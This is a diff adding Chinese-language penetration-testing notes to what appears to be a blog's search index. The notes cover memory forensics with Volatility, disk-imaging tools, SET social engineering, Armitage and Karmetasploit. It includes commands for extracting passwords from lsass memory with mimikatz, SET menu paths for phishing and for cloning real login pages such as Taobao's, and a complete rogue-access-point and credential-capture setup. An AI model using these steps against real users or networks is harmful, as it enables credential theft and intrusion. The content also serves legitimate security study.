@@ -336,6 +336,302 @@
     
     
     <entry>
+      <title>活取证和死取证</title>
+      <link href="/2016/05/12/Forensics/%E6%B4%BB%E5%8F%96%E8%AF%81%E5%92%8C%E6%AD%BB%E5%8F%96%E8%AF%81/"/>
+      <url>/2016/05/12/Forensics/%E6%B4%BB%E5%8F%96%E8%AF%81%E5%92%8C%E6%AD%BB%E5%8F%96%E8%AF%81/</url>
+      
+        <content type="html"><![CDATA[<h4 id="活取证"><a href="#活取证" class="headerlink" title="活取证"></a><strong>活取证</strong></h4><ul><li><p><strong>从内存还原文字</strong></p><ul><li><code>https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx</code>        #procdump</li><li><code>https://technet.microsoft.com/en-us/sysinternals/bb897439.aspx</code>        #Windows下的strings工具  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">procdump -ma notepad.exe notepad.dmp</span><br><span class="line">strings notepad.dmp &gt; notepad.txt</span><br></pre></td></tr></table></figure></li><li>其它文字处理程序也适用</li></ul></li><li><p><strong>从内存还原图片</strong></p><ul><li>远程桌面,画图工具,Virtualbox虚拟机<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 7.raw --profile&#x3D;Win7SP1x64 memdump -p 1456 -D test</span><br><span class="line">apt-get install gimp#kali安装gimp图片处理工具,媲美windows的PS</span><br><span class="line">mv mstsc.dmp mstsc.data#更改dmp文件格式</span><br><span class="line">gimp -&gt; open -&gt; Raw Image Data -&gt; 调整参数</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>从内存中提取明文密码</strong></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">procdump -ma lsass.exe lsass.dmp#dump lsass.exe在内存文件,任何windows版本登录后都会启动lsass.exe进程,用于保存密码</span><br><span class="line"></span><br><span class="line">cd &#x2F;usr&#x2F;share&#x2F;windows-resources&#x2F;mimikatz&#x2F;x64#mimikatz win64版kali所在路径</span><br><span class="line"></span><br><span class="line">Mimikatz#使用mimikatz </span><br><span class="line"></span><br><span class="line">sekurlsa::minidump lsass.dmp#load 内存文件</span><br><span class="line"></span><br><span class="line">sekurlsa::logonPasswords#提取 dump文件的身份认证信息</span><br></pre></td></tr></table></figure><ul><li><p>Volatility 的 mimikatz 插件</p><ul><li><code>https://github.com/sans-dfir/sift-files/blob/master/volatility/mimikatz.py</code></li><li><code>volatility -f 7.raw imageinfo</code></li><li><code>volatility -f 7.raw --profile=Win7SP1x64 mimikatz</code></li></ul></li><li><p>Firefox 浏览器审计工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install dumpzilla</span><br><span class="line">dumpzilla &#x2F;root&#x2F;.mozilla&#x2F;firefox&#x2F;ugyw3gav.default&#x2F; --All</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="死取证"><a href="#死取证" class="headerlink" title="死取证"></a><strong>死取证</strong></h4><ul><li><p><strong>硬盘镜像</strong></p><ul><li>使用kali光盘启动计算机创建硬盘镜像文件</li><li>留足存储镜像文件的存储空间</li><li>dc3dd 传说来自美国空军计算机犯罪中心开发</li><li>dcfldd</li><li>guymager        #图形化dd工具</li><li>计算机取证技术参考数据集<ul><li><code>http://www.cfreds.nist.gov/Controlv1_0/control.dd</code></li></ul></li></ul></li><li><p><strong>DFF</strong> (Digital Forensics Framework)</p><ul><li>数字取证框架</li><li>kali2.0版本后被移出</li><li>支持命令行和友好图形化界面</li><li>Open Evidence        #红色表示已经删除的文件</li><li>发现恢复已经删除和隐藏的文件</li></ul></li><li><p><strong>Autopsy</strong></p><ul><li>非常流行的硬盘镜像分析工具</li><li>WebServer + 客户端架构</li></ul></li><li><p><strong>Extundelete</strong></p><ul><li>适用于ext3,ext4文件系统的反删除工具</li><li><code>Extundelete [device-file] --restore-file [restore location]</code></li></ul></li><li><p><strong>iPhone Backup Analyzer</strong></p><ul><li>分析iTunes 生成的iPhone 手机备份文件,并非电话image</li></ul></li><li><p><strong>Foremost</strong> (美国政府开发)</p><ul><li>从内存dump中恢复文档图片,支持raw,dd,iso,vmem等格式</li><li><code>foremost -t jpeg,gif,png,doc -i 7.raw</code></li></ul></li></ul><h4 id="网络取证"><a href="#网络取证" class="headerlink" title="网络取证"></a><strong>网络取证</strong></h4><ul><li>各种抓包dump分析</li><li>全流量镜像可还原历史</li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> 数字取证 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> strings </tag>
+            
+            <tag> mimikatz </tag>
+            
+            <tag> volatility </tag>
+            
+            <tag> 活取证 </tag>
+            
+            <tag> procdump </tag>
+            
+            <tag> gimp </tag>
+            
+            <tag> dc3dd </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>使用取证工具Volatility进行内存文件分析及相关插件</title>
+      <link href="/2016/05/11/Forensics/%E4%BD%BF%E7%94%A8%E5%8F%96%E8%AF%81%E5%B7%A5%E5%85%B7Volatility%E8%BF%9B%E8%A1%8C%E5%86%85%E5%AD%98%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%8F%92%E4%BB%B6/"/>
+      <url>/2016/05/11/Forensics/%E4%BD%BF%E7%94%A8%E5%8F%96%E8%AF%81%E5%B7%A5%E5%85%B7Volatility%E8%BF%9B%E8%A1%8C%E5%86%85%E5%AD%98%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%8F%92%E4%BB%B6/</url>
+      
+        <content type="html"><![CDATA[<h4 id="取证工具"><a href="#取证工具" class="headerlink" title="取证工具"></a><strong>取证工具</strong></h4><ul><li>不考虑法律因素,法庭证据,监管链,文档纪录等取证环节</li><li>只介绍Kali当中部分取证工具的使用方法</li><li>内存dump工具<ul><li><strong>Dumpit</strong> (windows)<ul><li>下载: <code>http://www.secist.com/wp-content/uploads/2016/11/DumpIt.zip</code></li></ul></li><li>内存文件与内存大小接近或者稍微大一点,raw格式</li></ul></li></ul><h4 id="分析内存文件-Volatility及相关插件"><a href="#分析内存文件-Volatility及相关插件" class="headerlink" title="分析内存文件    #Volatility及相关插件"></a><strong>分析内存文件</strong>    #Volatility及相关插件</h4><pre><code>volatility imageinfo -f xp.raw            #文件信息,关注profilevolatility hivelist -f XP.raw --profile=WinXPSP3x86        #数据库文件volatility -f XP.raw --profile=WinXPSP3x86 hivedump        #列出蜂巢volatility -f XP.raw --profile=WinXPSP3x86 hivedump -o 0xe124f8a8    #按虚拟内存地址查看注册表内容volatility -f XP.raw --profile=WinXPSP3x86 printkey -K &quot;SAM\Domains\Account\Users\Names&quot;     #用户账号volatility -f xp.raw --profile=WinXPSP3x86 printkey -K &quot;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;        #最后登录的用户volatility -f XP.raw --profile=WinXPSP3x86 userassist    #正在运行的程序,运行过多少次,最后一次运行时间等volatility -f XP.raw --profile=WinXPSP3x86 pslist        #进程列表及物理内存位置volatility -f 7.raw --profile=Win7SP1x64 memdump -p 1456 -D test/    #dump进程内存    hexeditor 1456.dmp        #16进制查看内存文件    strings 1456.dmp &gt; 1111.txt        #提取字符串查看 grep password / @volatility cmdscan -f 7.raw --profile=Win7SP1x64    #命令行历史volatility netscan -f 7.raw --profile=Win7SP1x64    #网络连接volatility iehistory -f 7.raw --profile=Win7SP1x64        #ie历史volatility -f 7.raw --profile=Win7SP1x64 hivelist        #列出蜂巢    volatility -f 7.raw --profile=Win7SP1x64 hashdump -y system内存虚地址 -s SAM内存虚地址        #提取hash</code></pre><p><strong>Volatility三方Firefoxhistory插件</strong></p><pre><code>http://downloads.volatilityfoundation.org/contest/2014/DaveLasalle_ForensicSuite.zip/usr/lib/python2.7/dist-packages/volatility/plugins/    #放到此路径volatility -f 7.raw --profile=Win7SP1x64 firefoxhistory        #查看firefox历史</code></pre><p><strong>USN日志记录插件</strong></p><ul><li>NTFS特性,用于跟踪硬盘内容变化(不记录具体变更内容)<ul><li><code>https://raw.githubusercontent.com/tomspencer/volatility/master/usnparser/usnparser.py</code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 7.raw --profile&#x3D;Win7SP1x64 usnparser --output&#x3D;csv --outputfile&#x3D;usn.csv</span><br><span class="line">#查看USN日志并导出到csv文件</span><br></pre></td></tr></table></figure></li></ul></li></ul><p><strong>Timeline插件</strong></p><pre><code>volatility -f 7.raw --profile=Win7SP1x64 timeliner    #从多个位置收集大量系统活动信息</code></pre><p><strong>内存取证发现恶意程序</strong></p><ul><li><p>恶意程序库</p><ul><li><code>https://github.com/volatilityfoundation/volatility/wiki/Memory-Samples</code></li><li><code>https://code.google.com/archive/p/volatility/wikis/SampleMemoryImages.wiki</code></li></ul></li><li><p>XP: 建立meterpreter session 后 dump 内存分析</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">volatility -f xp.raw --profile&#x3D;WinXPSP3x86 pstree</span><br><span class="line">volatility connscan#网络连接</span><br><span class="line">volatility getsids -p 111,222#SID,查看进程权限</span><br><span class="line">volatility dlllist -p 111,222#数量</span><br><span class="line">volatility malfind -p 111,222 -D test#输出结果查毒</span><br><span class="line">file *.dmp#查看文件类型</span><br></pre></td></tr></table></figure></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> 数字取证 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 数字取证 </tag>
+            
+            <tag> Volatility </tag>
+            
+            <tag> Dumpit </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>数字取证科学简介及取证方法</title>
+      <link href="/2016/05/01/Forensics/%E6%95%B0%E5%AD%97%E5%8F%96%E8%AF%81%E7%A7%91%E5%AD%A6%E7%AE%80%E4%BB%8B%E5%8F%8A%E5%8F%96%E8%AF%81%E6%96%B9%E6%B3%95/"/>
+      <url>/2016/05/01/Forensics/%E6%95%B0%E5%AD%97%E5%8F%96%E8%AF%81%E7%A7%91%E5%AD%A6%E7%AE%80%E4%BB%8B%E5%8F%8A%E5%8F%96%E8%AF%81%E6%96%B9%E6%B3%95/</url>
+      
+        <content type="html"><![CDATA[<h4 id="取证科学简介"><a href="#取证科学简介" class="headerlink" title="取证科学简介"></a><strong>取证科学简介</strong></h4><ul><li>Forensic investigations</li><li>法庭取证调查</li><li>事件相应调查<ul><li>黑客攻击,渗透测试留痕</li></ul></li></ul><p><strong>什么是Forensic科学</strong></p><ul><li>法医的,用于法庭的,辩论学,法医学</li><li>为了侦破案件还原事实真相,收集法庭证据的一系列科学方法<ul><li>参考本地区法律要求</li><li>实践操作通用原则</li></ul></li></ul><p><strong>CSI:物理取证</strong></p><ul><li>指纹,DNA,弹道,血迹</li><li>物理取证的理论基础是物质交换原则</li></ul><p><strong>数字取证/计算机取证/电子取证</strong></p><ul><li>智能设备,计算机,手机平板,IoT,有线及无线通信,数据存储</li></ul><h4 id="计算机取证通用原则"><a href="#计算机取证通用原则" class="headerlink" title="计算机取证通用原则"></a><strong>计算机取证通用原则</strong></h4><ul><li><p><strong>维护证据完整性</strong></p><ul><li>数字取证比物理取证幸运得多,可以有无限数量的拷贝进行分析</li><li>数字HASH值验证数据完整性</li></ul></li><li><p><strong>维护监管链</strong></p><ul><li>物理证物保存在证物袋中,每次取出使用严格纪录,避免破坏污染</li><li>数字证物原始版本写保护,使用拷贝进行分析</li></ul></li><li><p><strong>标准的操作步骤</strong></p><ul><li>证物使用严格按照规范流程,即使事后证明流程有误(免责)</li></ul></li><li><p>取证分析全部过程纪录文档</p></li><li><p><strong>数字取证者的座右铭</strong></p><ul><li>不要破坏数据现场(看似简单,实际几乎无法实现)</li><li>寄存器,CPU缓存,I/O设备缓存等易失性数据几乎无法获取</li><li>系统内存是主要的易失性存储介质取证对象,不修改无法获取其中数据</li><li>非易失性存储介质通常使用完整镜像拷贝保存</li><li>正常关机还是直接拔掉电源(数据丢失破坏)</li></ul></li><li><p><strong>证据搜索</strong></p><ul><li>数据</li><li>信息</li><li>证据</li></ul></li><li><p>作为安全从业者</p><ul><li>通过取证还原黑客入侵的轨迹</li><li>作为渗透测试和黑客攻击区分标准<ul><li>世纪佳缘事件</li><li>印象笔记渗透测试事件</li></ul></li></ul></li></ul><h4 id="取证方法"><a href="#取证方法" class="headerlink" title="取证方法"></a><strong>取证方法</strong></h4><ul><li><p><strong>活取证</strong></p><ul><li>抓取文件metadata,创建时间线,命令历史,分析日志文件,哈希摘要,转存内存信息</li><li>使用未受感染的干净程序执行取证</li><li>U盘 / 网络 存储收集到的数据</li></ul></li><li><p><strong>死取证</strong></p><ul><li>关机后制作硬盘镜像,分析镜像(MBR,GPT,LVM)</li></ul></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> 数字取证 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 数字取证 </tag>
+            
+            <tag> 计算机取证 </tag>
+            
+            <tag> 电子取证 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>社会工程学工具包Setoolkit</title>
+      <link href="/2016/03/20/Exploits/MsF/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E5%B7%A5%E5%85%B7%E5%8C%85Setoolkit/"/>
+      <url>/2016/03/20/Exploits/MsF/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E5%B7%A5%E5%85%B7%E5%8C%85Setoolkit/</url>
+      
+        <content type="html"><![CDATA[<h4 id="为什么在这说社会工程学-Social-Engineering"><a href="#为什么在这说社会工程学-Social-Engineering" class="headerlink" title="为什么在这说社会工程学 (Social Engineering)"></a><strong>为什么在这说社会工程学</strong> (Social Engineering)</h4><ul><li>Metasploit 可以很好的配合到社会工程学攻击的各个阶段</li><li>Setoolkit 工具包大量依赖 Metasploit</li><li>基于浏览器等客户端软件漏洞实现对客户端计算机的攻击</li></ul><h4 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a><strong>社会工程学</strong></h4><ul><li><p><strong>社会</strong></p><ul><li>人是社会化的动物(人与人之间的关系,群体利益决定结构架构)</li></ul></li><li><p><strong>工程</strong></p><ul><li>依据标准的步骤完成任务达成目标的一套方法</li><li>通过与人的交流,使用欺骗伪装等手段绕过安全机制实现入侵的非技术手段</li></ul></li></ul><p><strong>社会工程学攻击的四个阶段</strong></p><ol><li><strong>研究</strong>:<ul><li>信息收集(Web,媒体,垃圾桶,物理接触),确定并研究目标人</li></ul></li><li><strong>钩子</strong>:<ul><li>与目标建立第一次交谈(Hook,下套)</li></ul></li><li><strong>下手</strong>:<ul><li>与目标建立信任并获取信息</li></ul></li><li><strong>退场</strong>:<ul><li>不引起目标怀疑的离开攻击现场</li></ul></li></ol><ul><li><p><strong>类型</strong></p><ul><li><p>基于人的社工</p><ul><li>搭载</li><li>伪造身份</li><li>偷听/窃肩</li><li>反社工</li><li>垃圾桶工程</li></ul></li><li><p>基于计算机的社工</p><ul><li>弹出窗口</li><li>内部网络攻击</li><li>钓鱼邮件</li><li>419尼日利亚骗局</li><li>短信诈骗</li></ul></li></ul></li></ul><h4 id="Social-Engineering-Toolkit-SET"><a href="#Social-Engineering-Toolkit-SET" class="headerlink" title="Social-Engineering Toolkit (SET)"></a><strong>Social-Engineering Toolkit</strong> (SET)</h4><ul><li><p>SET工具菜单</p><ol><li>鱼叉式网络钓鱼攻击向量</li><li>网站攻击向量</li><li>传染性媒体生成器    </li><li>创建有效载荷和侦听器</li><li>群发邮件攻击</li><li>基于Arduino的攻击向量</li><li>无线接入点攻击向量</li><li>QRCode生成器攻击向量</li><li>Powershell攻击向量<ol start="10"><li>第三方模块</li></ol></li></ol></li><li><p>站点克隆: 1 2 3 2</p><ul><li><code>https://login.taobao.com/member/login.jhtml</code></li><li><code>http://admin.smeshx.gov.cn/login.php</code></li></ul></li><li><p>制作BadUSB: 1 3 1 2</p></li><li><p>发送钓鱼邮件: 1 1 2</p></li><li><p>WEB站站攻击向量: 1 2 1 2</p></li><li><p>中间文件全部存在 ~/.set目录中</p></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> 漏洞利用 </category>
+          
+          <category> MSF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> MSF </tag>
+            
+            <tag> 社会工程学 </tag>
+            
+            <tag> Setoolkit </tag>
+            
+            <tag> BadUSB </tag>
+            
+            <tag> 钓鱼邮件 </tag>
+            
+            <tag> Arduino </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>MsF图形化端Armitage简介及使用方法</title>
+      <link href="/2016/03/19/Exploits/MsF/MsF%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%AB%AFArmitage%E7%AE%80%E4%BB%8B%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
+      <url>/2016/03/19/Exploits/MsF/MsF%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%AB%AFArmitage%E7%AE%80%E4%BB%8B%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
+      
+        <content type="html"><![CDATA[<h4 id="Armitage图形化前端"><a href="#Armitage图形化前端" class="headerlink" title="Armitage图形化前端"></a><strong>Armitage图形化前端</strong></h4><ul><li><p>开源免费图形前端</p><ul><li>作者自称是众多不会使用matasploit的安全专家之一(命令行)</li><li>MSF基于命令行,缺少直观的GUI图形用户接口</li></ul></li><li><p>Armitage只是调用MSF的漏洞利用能力</p><ul><li>Armitage的每一个GUI操作都可以对应MSF中的一条命令</li></ul></li><li><p>红队团队合作模拟对抗</p><ul><li>分为客户端(armitage)和服务器(msfrpcd)两部分</li><li><code>/usr/share/armitage/teamserver ip password</code></li></ul></li><li><p>可脚本化</p></li></ul><p><strong>启动方式</strong></p><pre><code>service postgresql startTeamserver    服务器: teamserver 服务器IP 连接密码    客户端: armitage</code></pre><ul><li>单机启动<ul><li>Armitage</li><li>GUI 启动</li><li><code>127.0.0.1:55553</code></li></ul></li></ul><h4 id="Armitage发现主机"><a href="#Armitage发现主机" class="headerlink" title="Armitage发现主机"></a><strong>Armitage发现主机</strong></h4><ul><li><p>手动添加IP地址</p></li><li><p>扫描结果导入(nmap,nessus,openvas,appscan,nexpose,awvs)</p><ul><li>使用nmap扫描网段所有主机导出到host.xml文件<ul><li><code>nmap 192.168.190.0/24 --open -oX host.xml</code></li></ul></li></ul></li><li><p>直接扫描发现(nmap,msf扫描模块)</p></li><li><p>DNS枚举发现</p></li><li><p>扫描端口及服务</p></li></ul><p><strong>工作区 workspace</strong></p><ul><li>个人视角的目标动态显示筛选,同一team的队员算定义工作区</li><li>基于IP地址的工作区划分</li><li>基于端口的工作区划分</li><li>基于操作系统的工作区划分</li><li>基于标签的工作区划分</li></ul><h4 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a><strong>生成payload</strong></h4><ul><li><p>主动获取目标</p><ul><li>Armitage<ul><li><code>bind_hidden_tcp</code></li><li><code>bind_tcp</code></li><li><code>reverse_tcp</code></li><li><code>Ms08_067</code></li></ul></li></ul></li><li><p>被动获取目标</p><ul><li>Browser_autopwn2</li></ul></li></ul><p><strong>Meterpreter shell 能力展示</strong></p><ul><li>菜单功能</li><li>Cortana 脚本  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Veil-Evasion: </span><br><span class="line">locate veil-evasion#查找脚本所在路径位置</span><br><span class="line">&#x2F;use&#x2F;share&#x2F;veil-evasion&#x2F;tools&#x2F;cortana&#x2F;veil_evasion.cna</span><br><span class="line"></span><br><span class="line">#更多脚本</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;rsmudge&#x2F;cortana-scripts</span><br></pre></td></tr></table></figure></li><li>别无他法的最后选择<ul><li>Attacks<ul><li>Find Attacks        #自动分析匹配漏洞利用模块</li><li>Hail Mary            #上帝啊!赐予我力量吧!</li><li>洪水式漏洞利用代码执行,流量及特征明显,容易被发现</li></ul></li></ul></li></ul><h4 id="Armitage-现状"><a href="#Armitage-现状" class="headerlink" title="Armitage 现状"></a><strong>Armitage 现状</strong></h4><ul><li>维护不及时,传言此项目已荒废</li><li>仍然是目前唯一开源免费的metasploit图形前端</li><li>Metasploit 曾被发现两个远程代码执行漏洞<ul><li>问题都出在WEB组件方面</li><li>MSF不受影响</li></ul></li><li>安全面前软软平等<ul><li>没有无漏洞的软件</li></ul></li></ul><p><strong>Cobalt Strike</strong></p><ul><li>Cobalt Strike 也是一款以Metasploit为基础的GUI框架式渗透测试工具,集成了端口转发,服务扫描,自动化溢出,多模式端口监听,exe,powershell木马生成等.</li><li>商业红队模拟实战工具</li><li>有破解版</li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> 漏洞利用 </category>
+          
+          <category> MSF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> MSF </tag>
+            
+            <tag> nmap </tag>
+            
+            <tag> armitage </tag>
+            
+            <tag> teamserver </tag>
+            
+            <tag> Cobalt Strike </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>MsF无线攻击资源组件之Karmetasploit</title>
+      <link href="/2016/03/18/Exploits/MsF/MsF%E6%97%A0%E7%BA%BF%E6%94%BB%E5%87%BB%E8%B5%84%E6%BA%90%E7%BB%84%E4%BB%B6%E4%B9%8BKarmetasploit/"/>
+      <url>/2016/03/18/Exploits/MsF/MsF%E6%97%A0%E7%BA%BF%E6%94%BB%E5%87%BB%E8%B5%84%E6%BA%90%E7%BB%84%E4%BB%B6%E4%B9%8BKarmetasploit/</url>
+      
+        <content type="html"><![CDATA[<h4 id="Karmetasploit-无线攻击资源组件"><a href="#Karmetasploit-无线攻击资源组件" class="headerlink" title="Karmetasploit     无线攻击资源组件"></a><strong>Karmetasploit</strong>     无线攻击资源组件</h4><ul><li>伪造AP,嗅探密码,截获数据,浏览器攻击</li><li>官方下载的只适用于演示或概念验证,实际攻击场景无效</li><li>下载资源文件<ul><li><code>wget https://www.offensive-security.com/wp-content/uploads/2015/04/karma.rc_.txt</code></li><li>资源文件可根据自己的需求自定义  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">db_connect postgres:toor@127.0.0.1&#x2F;msfbook</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;browser_autopwn</span><br><span class="line"></span><br><span class="line">setg AUTOPWN_HOST 10.0.0.1</span><br><span class="line">setg AUTOPWN_PORT 55550</span><br><span class="line">setg AUTOPWN_URI &#x2F;ads</span><br><span class="line"></span><br><span class="line">set LHOST 10.0.0.1</span><br><span class="line">set LPORT 45000</span><br><span class="line">set SRVPORT 55550</span><br><span class="line">set URIPATH &#x2F;ads</span><br><span class="line"></span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;pop3</span><br><span class="line">set SRVPORT 110</span><br><span class="line">set SSL false</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;pop3</span><br><span class="line">set SRVPORT 995</span><br><span class="line">set SSL true</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;ftp</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;imap</span><br><span class="line">set SSL false</span><br><span class="line">set SRVPORT 143</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;imap</span><br><span class="line">set SSL true</span><br><span class="line">set SRVPORT 993</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;smtp</span><br><span class="line">set SSL false</span><br><span class="line">set SRVPORT 25</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;smtp</span><br><span class="line">set SSL true</span><br><span class="line">set SRVPORT 465</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;fakedns</span><br><span class="line">unset TARGETHOST</span><br><span class="line">set SRVPORT 5353</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;fakedns</span><br><span class="line">unset TARGETHOST</span><br><span class="line">set SRVPORT 53</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;http</span><br><span class="line">set SRVPORT 80</span><br><span class="line">set SSL false</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;http</span><br><span class="line">set SRVPORT 8080</span><br><span class="line">set SSL false</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;http</span><br><span class="line">set SRVPORT 443</span><br><span class="line">set SSL true</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;server&#x2F;capture&#x2F;http</span><br><span class="line">set SRVPORT 8443</span><br><span class="line">set SSL true</span><br><span class="line">run</span><br></pre></td></tr></table></figure></li></ul></li></ul><p><strong>安装其它依赖包</strong></p><pre><code>gem install activerecord sqlite3-ruby</code></pre><p><strong>基础架构安装配置</strong></p><pre><code>apt-get install isc-dhcp-server#dhcp配置修改cat /etc/dhcp/dhcpd.confoption domain-name-servers 10.0.0.1;default-lease-time 60;max-lease-time 72;ddns-update-style none;authoritative;log-facility local7;subnet 10.0.0.0 netmask 255.255.255.0 {range 10.0.0.100 10.0.0.254;option routers 10.0.0.1; option domain-name-servers 10.0.0.1;}</code></pre><h4 id="伪造AP"><a href="#伪造AP" class="headerlink" title="伪造AP"></a><strong>伪造AP</strong></h4><pre><code>airmon-ng start wlan0airbase-ng -P -C 30 -e &quot;FREE&quot; -v wlan0monifconfig at0 up 10.0.0.1 netmask 255.255.255.0touch /var/lib/dhcp/dhcpd.leases                #创建dhcp租约文件dhcpd -cf /etc/dhcp/dhcpd.conf at0</code></pre><p><strong>启动 Karmetasploit</strong></p><pre><code>msfconsole -q -r karma.rc_.txt</code></pre><ul><li>资源文件默认不允许用户上网,对实际场景几乎没有任何价值<ul><li>允许用户上网需要修改配置</li><li>删除setg参数</li><li>增加 browser_autopwn2等其它模块</li><li><code>use auxiliary/server/fakedns</code> DNS欺骗模块配置修改</li><li>检测恶意流量的模块: <code>auxiliary/vsploit/malware/dns*</code> <ul><li><code>vi karma.rc_.txt</code> 修改后如下:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 